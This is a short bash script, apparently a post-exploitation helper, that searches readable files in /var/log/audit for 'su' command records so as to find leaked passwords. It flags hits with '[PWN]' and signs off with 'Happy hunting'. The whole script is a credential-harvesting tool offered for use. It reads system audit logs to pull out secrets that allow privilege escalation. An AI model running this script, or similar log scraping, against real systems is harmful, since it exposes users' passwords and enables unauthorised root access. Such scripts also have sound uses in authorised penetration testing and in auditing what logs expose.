#!/bin/bash

echo "Shitty Audit Log SU Password Leak Finder woooo V 1.0"

# check if dirs exist
if [ ! -d "/var/log/audit" ]; then
    echo "No audit directory found lol rip"
    exit 1
fi

# check if user has perms there
cd /var/log/audit
# first check if we succeeded in getting there
if [ $? != 0 ]; then
    echo "[ERROR] Looks like we don't have permissions to get there boss"
    exit 1
fi

for file in *; do
    # check read perms
    head $file > /dev/null
    if [ $? == 1 ]; then
        echo "[INFO] No read perms for file $file. Moving on..."
    else
        # we can read it, grep it
        if [ "`grep 'comm="su"' $file`" != "" ]; then
            echo "[PWN] MAY HAVE FOUND SOMETHING WOOOO"
            grep 'comm="su"' $file
        fi
    fi
done

echo "[INFO] Script complete. Happy hunting :)"
